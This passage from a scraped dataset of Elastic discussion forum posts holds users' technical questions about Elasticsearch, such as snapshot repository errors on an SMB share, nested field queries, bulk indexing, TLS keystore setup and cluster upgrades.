    "body": "Elasticsearch 6.8.8 - this worked fine in 6.5.1. - Error is [2020-04-20T11:47:13,669][WARN ][o.e.r.RepositoriesService] [Cassiopeia] [linkstacks-backup-3] failed to finish repository verification org.elasticsearch.repositories.RepositoryVerificationException: [linkstacks-backup-3] cannot delete test data at at org.elasticsearch.repositories.blobstore.BlobStoreRepository.endVerification(BlobStoreRepository.java:644) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.repositories.RepositoriesService$3.lambda$onResponse$1(RepositoriesService.java:238) ~[elasticsearch-6.8.8.jar:6.8.8] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:681) [elasticsearch-6.8.8.jar:6.8.8] at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) [?:1.8.0_241] at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) [?:1.8.0_241] at java.lang.Thread.run(Unknown Source) [?:1.8.0_241] Caused by: java.io.IOException: could not remove the following files (in the order of attempts): \\\\mercury\\backup\\2020\\es\\tests-2pC8TNeDS5OQw06b8vaFzA: java.nio.file.DirectoryNotEmptyException: \\\\mercury\\backup\\2020\\es\\tests-2pC8TNeDS5OQw06b8vaFzA Read and write access seems to work fine Here is a log (image) of SMB actions in reverse order: Screenshot 2020-04-20 at 12.03.432254×846 579 KB Same in (messy) text form: delete Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/master.dat Windows-filoverførsel 2020-04-20 11:47:14 192.168.1.202 guest delete Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-n10o0Vd1TYCRhkttNI6kxQ.dat Windows-filoverførsel 2020-04-20 11:47:14 192.168.1.200 guest write Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-LC0RnV0RSuqaFQqc_hxD3g.dat Windows-filoverførsel 2020-04-20 11:47:14 192.168.1.200 guest create Fil NA /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-LC0RnV0RSuqaFQqc_hxD3g.dat Windows-filoverførsel 2020-04-20 11:47:14 192.168.1.205 guest write Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-HQEKTJS8RVex2H9EyYEBUg.dat Windows-filoverførsel 2020-04-20 11:47:14 192.168.1.205 guest create Fil NA /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-HQEKTJS8RVex2H9EyYEBUg.dat Windows-filoverførsel 2020-04-20 11:47:13 192.168.1.202 guest write Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-n10o0Vd1TYCRhkttNI6kxQ.dat Windows-filoverførsel 2020-04-20 11:47:13 192.168.1.202 guest create Fil NA /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/data-n10o0Vd1TYCRhkttNI6kxQ.dat Windows-filoverførsel 2020-04-20 11:47:13 192.168.1.202 guest rename Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/pending-master.dat-rSmojTwJTVS2hl0WZcAfZg -> /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/master.dat Windows-filoverførsel 2020-04-20 11:47:13 192.168.1.202 guest write Fil 22 Bytes /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/pending-master.dat-rSmojTwJTVS2hl0WZcAfZg Windows-filoverførsel 2020-04-20 11:47:13 192.168.1.202 guest create Fil NA /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA/pending-master.dat-rSmojTwJTVS2hl0WZcAfZg Windows-filoverførsel 2020-04-20 11:47:12 192.168.1.202 guest create Mappe NA /backup/2020/es/tests-2pC8TNeDS5OQw06b8vaFzA Thanks. Poul",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e008b788-b6f9-464f-9969-555af29480d4",
    "url": "https://discuss.elastic.co/t/search-nested-field-with-filtering/228831",
    "title": "Search nested field with filtering",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rajeev_Bhat",
    "date": "April 20, 2020, 10:01am",
    "body": "Hello, I need help in searching \"BirthDate\" field and in response I only need the results of BirthDates(source filtering). Can anyone help ? Sample document: { \"Payload\": { \"ProfileInfo\": { \"Profile\": { \"Customer\": { \"detail1\": { \"Gender\": \"Male\", \"BirthDate\": \"1990-01-28\" }, \"detail2\" : { \"Name\":\"abc\", \"ID\":123 } } } } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "541f02f2-1b6b-434c-8267-57bf2afedc28",
    "url": "https://discuss.elastic.co/t/continuous-transform-updated-documents/228396",
    "title": "Continuous transform, updated documents?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 16, 2020, 7:52pm April 19, 2020, 3:42pm April 19, 2020, 3:47pm April 20, 2020, 9:56am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9aafe00c-3ae0-498c-820d-22b4bb282256",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-change-the-prebuilt-rules-in-signal-detection-rules/228814",
    "title": "Is it possible to change the prebuilt rules in Signal detection rules",
    "category": [
      "Elasticsearch"
    ],
    "author": "sundar_elk",
    "date": "April 20, 2020, 8:47am",
    "body": "Hi Team, I want change the indices name instead of winlogbeat-* to entity-winlogbeat-* for prebuilt rules for windows in kibana but rules are not editable. Can you please suggest how to change the prebuilt rules.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "26f1771f-410d-4462-906b-34a24bbe0b0b",
    "url": "https://discuss.elastic.co/t/delete-nested-field-object-in-batches/228811",
    "title": "Delete nested field object in batches",
    "category": [
      "Elasticsearch"
    ],
    "author": "A_google_user",
    "date": "April 20, 2020, 8:43am",
    "body": "I have nested fields in the elastic search document. I want to delete those objects(nested objects) which have 'created_at' timestamp < Time.now- 6 months. 'created_at' field is inside the nested fields. This is what I am doing right now. fetch ES docs (using \"scroll\" in the batches of 100)that match timestamp criteria, delete the nested object from it. POST updated document into ES at the same id(bulk update). I am using \"scroll\" cause there is a limit of 10000 docs on the regular search query. Can we do better than this? for example, fetch only nested fields in the first place(not the whole doc) and perform the partial updates? one more doubt. the docs in which there is no nested object left(cause all the field match timestamp criteria) we need to delete the whole document. Can we do bulk delete in that case? { \"demand_supply_leads_20200218205905\":{ \"mappings\":{ \"leads\":{ \"dynamic\":\"false\", \"properties\":{ \"buy_leads\":{ \"type\":\"nested\", \"properties\":{ \"city_uuid\":{ \"type\":\"keyword\" }, \"created_at\":{ \"type\":\"integer\" } } }, \"pg_leads\":{ \"type\":\"nested\", \"properties\":{ \"city_uuid\":{ \"type\":\"keyword\" }, \"created_at\":{ \"type\":\"integer\" } } } } } } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f1f81755-3e17-4cdb-b857-e198305de6db",
    "url": "https://discuss.elastic.co/t/how-to-enable-x-pack-security-when-running-elasticsearch-locally-from-source-code/228533",
    "title": "How to enable x-pack security when running elasticsearch locally from source code",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 2:09pm April 20, 2020, 8:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b3998bac-f537-4ff3-8e85-07557fc9b61f",
    "url": "https://discuss.elastic.co/t/dynamic-data-and-none-index-fields/228728",
    "title": "Dynamic data and none index fields",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rhh",
    "date": "April 19, 2020, 12:26pm April 19, 2020, 1:35pm April 19, 2020, 1:49pm April 20, 2020, 8:18am",
    "body": "Hi I am trying to use ES and I am having trouble to get some fields not indexed. I put data into ES using serilog. In my setup I have a custom template like this : { \"index_patterns\": [ \"tds-\" ], \"settings\": { \"index.refresh_interval\": \"5s\" }, \"mappings\": { \"default\": { \"dynamic_templates\": [ { \"numerics_in_fields\": { \"path_match\": \"fields\\.[\\d+]$\", \"match_pattern\": \"regex\", \"mapping\": { \"type\": \"text\", \"index\": true, \"norms\": false } } }, { \"string_fields\": { \"match\": \"\", \"match_mapping_type\": \"string\", \"mapping\": { \"type\": \"text\", \"index\": true, \"norms\": false, \"fields\": { \"raw\": { \"type\": \"keyword\", \"index\": true, \"ignore_above\": 256 } } } } } ], \"properties\": { \"message\": { \"type\": \"text\", \"index\": true }, \"subject\": { \"type\": \"text\", \"index\": true }, \"logger\": { \"type\": \"text\", \"index\": true }, \"data\": { \"type\": \"object\" } } } } } } In my data I get results like this : { \"_index\" : \"tds-2020.04.19\", \"_type\" : \"logevent\", \"_id\" : \"WtKDkXEBSyGvzhhwIUVi\", \"_score\" : 1.0, \"_source\" : { \"@timestamp\" : \"2020-04-19T10:16:59.8418722+02:00\", \"level\" : \"Error\", \"message\" : \"{\\\"Message\\\":\\\"4 forsøk\\\",\\\"p1\\\":\\\"heisan\\\",\\\"xSystem\\\":{\\\"Process\\\":{\\\"Id\\\":20860,\\\"Name\\\":\\\"WindowsFormsApp11\\\"},\\\"Thread\\\":{\\\"Id\\\":1,\\\"Name\\\":\\\"trilili\\\",\\\"Culture\\\":\\\"nb-NO\\\"}}\", \"fields\" : { \"logger\" : \"name of application\", \"subject\" : \"Første forsøk\", \"data\" : { \"p1\" : \"heisan\", \"system/process/id\" : \"20860\", \"system/process/name\" : \"WindowsFormsApp11\", \"system/thread/id\" : \"1\", \"system/thread/name\" : \"trilili\", \"system/thread/culture\" : \"nb-NO\" } } } }, I would like the fields p1, system/… to be not indexed. How can I achieve that ? I think I need to change my template but everything I tried has so far not worked. The fields are added by an serilog enritcher with logEvent.AddOrUpdateProperty",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9b533d8e-b2d9-4f09-98a7-7cc7ef3ce23c",
    "url": "https://discuss.elastic.co/t/how-can-i-send-large-json-file-6-gb-to-elasticsearch-using-bulk-api/228712",
    "title": "How can I send large JSON file (6 GB) to Elasticsearch using bulk API?",
    "category": [
      "Elasticsearch"
    ],
    "author": "cezar996",
    "date": "April 19, 2020, 8:30am April 19, 2020, 9:04am April 19, 2020, 9:43am April 19, 2020, 9:55am April 20, 2020, 8:04am",
    "body": "Hello everybody! I have problems since a few days ago, when I try to send a large JSON file (aprox. 6 GB) to Elasticsearch using Bulk API. Before putting this question I have documented a lot and I saw there are two possibilities to send data to Elasticsearch: Bulk API or Logstash. In fact, Logstash uses behind the Bulk functionality. I know that when you want to send large files to Elasticsearch, you have to take into consideration the HTTP limitation, which is aprox. 2 GB, because data is firstly loaded into memory and then sent to Elasticsearch. Consequently, I split the large JSON file into smaller files, each of 350 MB (100.000 lines), using: split -l 100000 -a 6 large_data.json /home/.../Chunk_Files. Afterwards, I tried to send each one using the curl command: curl -s -H \"Content-Type: application/x-ndjson\" -XPOST localhost:9200/_bulk --data-binary \"@Chunk_Filesaaaaaa.json, but I get nothing in terminal (neither success, nor error). Also I don't get anything in Elasticsearch. I have to mention that my file contains 100.000 lines of this form: {\"_index\":\"filename-log-2020.04\",\"_type\":\"logevent\",\"_id\":\"blabla\",\"_score\":1,\"_source\":.... If you have any idea where I am wrong or you could give me other alternatives which may work I would be very happy! There should be professional people who know a solution to my problem. Thanks in advance!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "98bf4fa1-c4c0-4447-81da-a88c0117136b",
    "url": "https://discuss.elastic.co/t/elasticsearch-trace-route/228784",
    "title": "Elasticsearch Trace Route",
    "category": [
      "Elasticsearch"
    ],
    "author": "Alsheh",
    "date": "April 20, 2020, 4:53am April 20, 2020, 7:42am April 20, 2020, 7:33am April 20, 2020, 7:37am",
    "body": "Is there a way to trace the route of search & indexing requests to nodes within the cluster? I have lots of dedicated nodes in the cluster and I want to confirm requests routing is optimized by checking the path the requests take to the targeted shards. Thanks!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a3da24df-1daa-4e53-84cf-489b9cda98eb",
    "url": "https://discuss.elastic.co/t/security-with-ldap/228779",
    "title": "Security with ldap",
    "category": [
      "Elasticsearch"
    ],
    "author": "rwr",
    "date": "April 20, 2020, 4:40am April 20, 2020, 8:13am",
    "body": "can LDAP used for Elasticsearch in Free license ? thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "46c2135b-e71b-444a-924f-4c8e67debce4",
    "url": "https://discuss.elastic.co/t/docker-elasticsearch-geoip-user-agent-pipeline/228517",
    "title": "Docker + Elasticsearch + Geoip + User Agent Pipeline",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 17, 2020, 1:03pm April 20, 2020, 6:24am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "97f80530-9789-4a00-bd73-cb3303cecab1",
    "url": "https://discuss.elastic.co/t/sort-shards-by-indexing-time/228787",
    "title": "Sort Shards By Indexing Time",
    "category": [
      "Elasticsearch"
    ],
    "author": "Alsheh",
    "date": "April 20, 2020, 5:08am",
    "body": "Is there a way to sort shards by indexing time metric? My specific scenario is that Logstash makes a bulk requests to various indices but one index might have inefficient mapping which allows for fields explosion which slows down indexing on specific node for all indices, in some cases results in requests rejection due to full write queue. I'm hoping by identifying the slowest shard for indexing I could move it to a different node or at least narrow down the scope of the problem more quickly. Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6c4253f4-a23b-4cab-aeb9-a2ec906ba8a9",
    "url": "https://discuss.elastic.co/t/how-to-slove-this-error/228776",
    "title": "How to slove this error?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Yungyoung_Ok",
    "date": "April 20, 2020, 7:01am April 20, 2020, 5:07am",
    "body": "image889×45 30.8 KB org.elasticsearch.transport.RemoteTransportException: host[indices:data/read/search[phase/query]] Caused by: java.lang.IllegalArgumentException: No aggregation found for path [61ca57fe-469d-11e7-af02-69e460af7417] When and why does this error occur?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "39192486-e726-4973-a60e-a9ae5944e683",
    "url": "https://discuss.elastic.co/t/how-to-move-part-of-the-elastic-snapshots-into-another-disk/228780",
    "title": "How to move part of the elastic snapshots into another disk",
    "category": [
      "Elasticsearch"
    ],
    "author": "111321",
    "date": "April 20, 2020, 4:44am",
    "body": "Hi, I am thinking if it is possible to move the part of elastic snapshots into another disk if we have a disk size problem? Think about this, we have a requirement to back up the last 14 days data, it if longer than 14 days, we need to move the backup to somewhere else, but how should I move those old snapshots into other places? The folder structure seems optimized by elastic, and I can't just copy the backup that I want to have. One of the options could be create a different repo, for example, two repos per month, so that I can move one of the repo outside of my disk. Any better solution? Thanks in advance. Br, Tm",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d6490ac4-fd0c-481b-bc19-eeac2cfbdfa4",
    "url": "https://discuss.elastic.co/t/elastic-spark-and-ilm/228750",
    "title": "Elastic, spark and ILM",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 19, 2020, 5:57pm April 19, 2020, 11:15pm April 19, 2020, 11:16pm April 20, 2020, 12:13am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "bd07b2c2-9383-4c2f-b593-2138f41a112c",
    "url": "https://discuss.elastic.co/t/elastic-stack-for-node-angular/228452",
    "title": "Elastic stack for Node & Angular",
    "category": [
      "Elasticsearch"
    ],
    "author": "Bhagyashree_S.B",
    "date": "April 17, 2020, 5:12am April 17, 2020, 5:44am April 17, 2020, 7:00am April 17, 2020, 8:33am April 19, 2020, 11:08pm",
    "body": "Hi, We have recently started to setup centralized logging for our projects using Elastic stack. The projects are built with Angular as the frontend framework & NodeJS as the middleware. Please suggest on how to send the application logs, from both Angular & NodeJS layer, to elasticsearch.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "76255db1-6acc-4dea-b08a-c34b66cc912f",
    "url": "https://discuss.elastic.co/t/unable-to-configure-elasticsearch-security/228752",
    "title": "Unable to configure elasticsearch security",
    "category": [
      "Elasticsearch"
    ],
    "author": "Blason",
    "date": "April 19, 2020, 6:42pm",
    "body": "Hi Folks, I am trying to build security between elasticsearch and kibana to make SIEM detection work. However been struggling for so long. I followed lot of tutorials and generated p12 file. Here is my config file #action.destructive_requires_name: true # This turns on SSL for the HTTP (Rest) interface xpack.security.http.ssl.enabled: true # This configures the keystore to use for SSL on HTTP xpack.security.http.ssl.keystore.path: \"http.p12\" Then followed README for kibana. however I am unable to start elasticsearch service and here are my errors. Per error it seel http.p12 file does not exist. But when I see the file is there under /etc/elasticsearch ls -l /etc/elasticsearch/http.p12 -rw------- 1 root root 10602 Apr 19 23:49 /etc/elasticsearch/http.p12 And error is as below Caused by: org.elasticsearch.ElasticsearchException: failed to create trust manager at org.elasticsearch.xpack.core.ssl.TrustConfig$CombiningTrustConfig.createTrustManager(TrustConfig.java:172) ~[?:?] at org.elasticsearch.xpack.core.ssl.SSLService.createSslContext(SSLService.java:427) ~[?:?] at java.util.HashMap.computeIfAbsent(HashMap.java:1138) ~[?:?] at org.elasticsearch.xpack.core.ssl.SSLService.loadConfiguration(SSLService.java:521) ~[?:?] ... 26 more Caused by: org.elasticsearch.ElasticsearchException: failed to initialize SSL TrustManager - keystore file [/etc/elasticsearch/http.p12] does not exist at org.elasticsearch.xpack.core.ssl.TrustConfig.missingTrustConfigFile(TrustConfig.java:113) ~[?:?] Any clue folks?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "474f3212-13c3-4c24-be1e-5ffd673f79c3",
    "url": "https://discuss.elastic.co/t/bulk-delete-role-mappings/227688",
    "title": "Bulk delete role mappings",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 12, 2020, 5:34pm April 19, 2020, 6:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b6643389-9a2f-47c8-bf4c-cc5681daad72",
    "url": "https://discuss.elastic.co/t/upgrade-from-elk-5-4-to-7-6/228721",
    "title": "Upgrade from ELK 5.4 to 7.6",
    "category": [
      "Elasticsearch"
    ],
    "author": "111320",
    "date": "April 19, 2020, 11:02am April 19, 2020, 12:04pm April 19, 2020, 12:12pm April 19, 2020, 1:38pm April 19, 2020, 2:36pm April 19, 2020, 2:46pm April 19, 2020, 6:06pm",
    "body": "I need to upgrade my system (linux) from ELK 5.4 to 7.6. I saw several guides about using Upgrade Assistant but it is not exist in Kibana 5.4. I don't need the old indices and I already delete all indices. The system consist of 5 hosts. On the master host I have Elasticsearch, Kibana and Logstash. On other 4 hosts I have only Elasticsearch. What is the right way for doing it? Thanks in advance",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "4b362033-f118-4cf8-ba1d-9681bd6ee095",
    "url": "https://discuss.elastic.co/t/what-is-the-alternative-way-of-querying-all-from-elasticsearch-6-x-onwards/228749",
    "title": "What is the alternative way of querying _all from elasticsearch 6.x onwards?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Deb",
    "date": "April 19, 2020, 5:31pm April 19, 2020, 5:36pm April 19, 2020, 5:53pm April 19, 2020, 5:59pm",
    "body": "I posted the same in stackoverflow but did not get any reply. Just posting the same here in case someone has any suggestions. As mentioned in the doc, from elasticsearch 6.x _all has been deprecated. I have a matchQuery like below QueryBuilders.boolQuery() .should(QueryBuilders.matchQuery(\"_all\", typeAndName.name)) .should(buildMatchQuery( SearchFields.kObjectNameKey, dataModel.getLowerFieldName(PropertyType.STRING, SearchFields.kObjectNameKey), typeAndName.name)); Can someone suggest what is the recommended way of doing the same now? In my case, I don't know beforehand what all fields can be there in the index so I cannot use copy_to in index mapping to copy all fields data to some other field to simulate all.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "70f2844c-8e75-4fce-a830-1c8e6b2380c0",
    "url": "https://discuss.elastic.co/t/updating-nodes-in-elasticsearch-cluster/228737",
    "title": "Updating nodes in Elasticsearch cluster",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 19, 2020, 2:47pm April 19, 2020, 4:26pm April 19, 2020, 5:52pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "39d3b96a-abfa-4a3f-b683-0cdd8276b474",
    "url": "https://discuss.elastic.co/t/sort-by-length-of-an-array/225742",
    "title": "Sort by length of an array",
    "category": [
      "Elasticsearch"
    ],
    "author": "RajaG",
    "date": "March 30, 2020, 8:15pm April 3, 2020, 4:14pm April 7, 2020, 4:38pm April 7, 2020, 5:22pm April 19, 2020, 5:04pm",
    "body": "PUT wc { \"mappings\": { \"properties\": { \"comments\": { \"type\": \"text\", \"fields\": { \"word_count\": { \"type\": \"token_count\", \"analyzer\": \"standard\" } } } } } } PUT wc/_doc/1 { \"comments\" : [\"hi\", \"hello\", \"how r u\"] } PUT wc/_doc/2 { \"comments\" : [\"hi\", \"hello\", \"how r u\" , \"fine\"] } GET wc/_search { \"sort\": [ { \"comments.word_count\": { \"order\": \"desc\" } } ] } this isn't giving correct results. how should i troubleshoot this?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7dab2e42-14cf-4d9b-8552-375be71cbe67",
    "url": "https://discuss.elastic.co/t/inference-processor-put-error/228674",
    "title": "Inference processor PUT error",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 19, 2020, 3:40pm April 19, 2020, 3:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "711ad0c3-f0ef-4a2f-80a4-6abbd77d440e",
    "url": "https://discuss.elastic.co/t/fuzzy-search-question/228675",
    "title": "Fuzzy search question",
    "category": [
      "Elasticsearch"
    ],
    "author": "giorgio",
    "date": "April 18, 2020, 7:34pm April 19, 2020, 12:15pm April 19, 2020, 1:27pm April 19, 2020, 1:35pm April 19, 2020, 1:37pm April 19, 2020, 1:41pm",
    "body": "Hello I am doing reverse image search using elasticsearch. I have hashes stored in index and now I am trying to find similar hashes(to compensate compression and what not) using Query String fuzziness. my code for search is: var searchResponse = await Program._elasticclient.SearchAsync<IndexedImage> ( s => s.Index(\"images\").Query(q => q.QueryString(qs => qs.FuzzyMaxExpansions(150).Fuzziness(Fuzziness.EditDistance(150)).Fields(f => f.Field(ff => ff.imagehash)).Query(imagehash))).Size(10000) ).ConfigureAwait(false); imagehash field is string holding hash(~600 character long number) When I am trying to find similar strings it works fine but it's not working well at some cases and I am wondering whats wrong. For example, this is original hash and when searching it returns 2 results from DB: 222230302101000014343434014133341141303411413033013140410000000304142022222214134313414240103030010130300101101003031110130314133303434110102222222243431000030024241411432324214232141143133431411144421000030034042222222214111333121143232223323211113333333331211311333344442000444340002222222201013434222032323130110111103303323011011110330334330101343111112222222231333111010244440400444434304131141343134444400044441030131133432222222233311131101423130001444401044444434400404444003041410020000034242222222201003414434300000000343430310131303201013131010102003434121143032222224203034444444410002123421201033444343421413434314101044444444230402222 This is hash of similar image(levenshtein distance is 52) and when searched db returns 0 results: 222230302101000024343434014133341141303411413033013140410000000204242022222214134313414140103030010130300101101003031110130314133303424120102222222243431000030034241411432324214222141143133431411144421000030034042222222214111333121243232223323212113333333331211312333344432010444340002222222201013434323021312120120211103303323011011110230333331101343111112222222231333111010244440400444434304131141443134444400044441030131133432222222233311131101423130001444401044444434400404444003041410030000034242222222201003414434300000000343430310131303201013131010101003434222142022222224203024444444410002123421211133343343421413434314101044444444230402222 When I took original hash and replaced bunch of numbers with same amount of 9s I got levenshtein distance 59 and search returned 2 results as original. hash: 222230302101000014343434014133341141303411413033013140410000000304142022222214134313414240103030010130300101101003031110130314133303434110102222222243431000030024241411432324214232141143133431411144421000030034042222222214111333121143232223323211113333333331211311333344442000444340002222222201013434222032323130110199999999999999999999999999999999999999999999999999999999190244440400444434304131141343134444400044441030131133432222222233311131101423130001444401044444434400404444003041410020000034242222222201003414434300000000343430310131303201013131010102003434121143032222224203034444444410002123421201033444343421413434314101044444444230402221 all hashes I have stored and ones I am searching are always same in length. Similarity can be compared properly here: https://countwordsfree.com/comparetexts Can anyone point me to right direction and tell me what am I doing wrong here? Thanks in advance",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "8b503b0c-2be5-4686-88a5-5e7b374f1038",
    "url": "https://discuss.elastic.co/t/getting-the-transport-client-address/228457",
    "title": "Getting the Transport Client address",
    "category": [
      "Elasticsearch"
    ],
    "author": "Siddharth1010",
    "date": "April 17, 2020, 6:55am April 17, 2020, 7:57am April 19, 2020, 11:24am April 19, 2020, 12:00pm",
    "body": "I am using Elasticsearch version number 6.2.4. This is the Configuration file that I am using for java import org.elasticsearch.client.Client; import org.elasticsearch.client.transport.TransportClient; import org.elasticsearch.common.settings.Settings; import org.elasticsearch.common.transport.TransportAddress; import org.elasticsearch.transport.client.PreBuiltTransportClient; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.elasticsearch.core.ElasticsearchTemplate; import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories; import java.net.InetAddress; import java.net.UnknownHostException; @Configuration @EnableElasticsearchRepositories public class Config { @Bean public Client elasticsearchClient() throws UnknownHostException { Settings settings = Settings.builder().put(\"cluster.name\", \"elasticsearch\").build(); TransportClient client = new PreBuiltTransportClient(settings); client.addTransportAddress(new TransportAddress(InetAddress.getByName(\"127.0.0.1\"), 9300)); return client; } @Bean(name = {\"elasticsearchOperations\", \"elasticsearchTemplate\"}) public ElasticsearchTemplate elasticsearchTemplate() throws UnknownHostException { return new ElasticsearchTemplate(elasticsearchClient()); } } Trying to add data to the elasticsearch repository using POST Mapping, I am getting the following error: { \"timestamp\": \"2020-04-17T06:46:13.929+0000\", \"status\": 500, \"error\": \"Internal Server Error\", \"message\": \"None of the configured nodes are available: [{#transport#-1} {HUYVYb8YTXSNaYF_Givu5Q}{127.0.0.1}{127.0.0.1:9300}]\", \"path\": \"/event/save\" } The elasticsearch instance provided by me is not running locally, but on a server provided by the company. The possible source of error that I think is that the Transport Client is not running on port 9300 but on some other port so I need to change its configuration file. Is there any way that I can find out the transport client address or there is any other error.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "067a3822-b644-4f96-8c97-eaacf43e3ce4",
    "url": "https://discuss.elastic.co/t/renaming-an-existing-field-in-a-nested-object/228667",
    "title": "Renaming an existing field in a nested object",
    "category": [
      "Elasticsearch"
    ],
    "author": "waynesmallman",
    "date": "April 18, 2020, 5:45pm April 18, 2020, 9:00pm April 18, 2020, 9:07pm April 19, 2020, 2:45am April 19, 2020, 9:55am",
    "body": "Hi! I need to rename an existing field in a nested object: \"shared\": { \"type\": \"nested\", \"properties\": { \"user_id\": { \"type\": \"long\" }, \"creation\": { \"type\": \"date\", \"format\": \"date_hour_minute_second\" }, \"access\": { \"type\": \"keyword\" } } } … and so far I have the following request: PUT _ingest/pipeline/rename_field_shared_access { \"description\" : \"Rename the 'shared.access' field to: 'shared.access_type'\", \"processors\" : [ { \"rename\": { \"field\": \"shared.access\", \"target_field\": \"shared.access_type\" } } ] } I'm assuming the dot notation is correct? Also, I would need to extend the nested object with additional fields: \"shared\": { \"type\": \"nested\", \"properties\": { \"user_id\": { \"type\": \"long\" }, \"creation\": { \"type\": \"date\", \"format\": \"date_hour_minute_second\" }, \"modification\": { \"type\": \"date\", \"format\": \"date_hour_minute_second\" }, \"access_type\": { \"type\": \"keyword\" }, \"resource_recipient_type\": { \"type\": \"keyword\" }, \"resource_recipient_id\": { \"type\": \"long\" } } } I'm 99.9% this is possible using Dynamic Mapping, but I need to check with the experts!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "204c9cb8-3067-444d-80e1-1ccf5fe951b9",
    "url": "https://discuss.elastic.co/t/whats-the-best-way-to-migrate-single-node-elasticsearch-data-to-a-multinode-elasticsearch-environment/228199",
    "title": "Whats the best way to migrate single node elasticsearch data to a multinode elasticsearch environment?",
    "category": [
      "Elasticsearch"
    ],
    "author": "deep9300",
    "date": "April 15, 2020, 7:52pm April 15, 2020, 8:46pm April 15, 2020, 8:59pm April 16, 2020, 5:41pm April 16, 2020, 7:29pm April 16, 2020, 9:30pm April 17, 2020, 5:54pm April 19, 2020, 4:25am",
    "body": "I want to move my single node elasticsearch cluster data to a 3 node elasticsearch cluster. Only a few gb worth of data at first to test it out then proceed to move close to a 100gb. What is best way to this? Are any articles or instructions I can follow. Appreciate your help. Thank you.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "05173a9d-e7a3-4ae2-9cc6-cae331328fa6",
    "url": "https://discuss.elastic.co/t/update-by-query-on-object-not-in-source/228688",
    "title": "Update by Query on Object not in source",
    "category": [
      "Elasticsearch"
    ],
    "author": "pcb",
    "date": "April 19, 2020, 3:43am",
    "body": "Hello, (Note when I say parent/child below, I'm talking about objects not actual parent/child relationships) I'm attempting to perform an update using _update_by_query, however, my documents have several multi-tiered objects where the parent isn't always going to exist. When it tries to update documents with parent missing, it throws a null_pointer_exception. Note: Some of the documents have the parent with child fields and some don't. Is there a way to do this to ensure every matching document is updated with the new fields, but no other child fields (like 'name' below) are deleted. I ask because all my updates by doc upserts work fine...feels like there should be a way I'm missing to essentially perform an upsert on query_by_update (i.e. create parent object when creating children if it doesn't exist). [Edit: I realize this isn't an upsert so much as a lazy creation of the object's parent on update]. Below is a minimal example and error and my hack around it which overrides fields I want to stay. Thank you for any help you can provide! Patrick DELETE objectexample PUT objectexample PUT objectexample/_mapping/_doc { \"properties\": { \"top_field\": { \"type\": \"keyword\" }, \"user\": { \"properties\": { \"email\": { \"type\": \"keyword\" }, \"name\": { \"type\": \"keyword\" } } } } } POST objectexample/_doc/1/_update { \"doc\": { \"top_field\": \"blah\" }, \"doc_as_upsert\": true } POST objectexample/_doc/2/_update { \"doc\": { \"top_field\": \"blah\", \"user\": { \"name\": \"Bob Jones\" } }, \"doc_as_upsert\": true } # This doesn't work, throws error seen below POST objectexample/_update_by_query { \"query\": { \"term\": { \"top_field\": 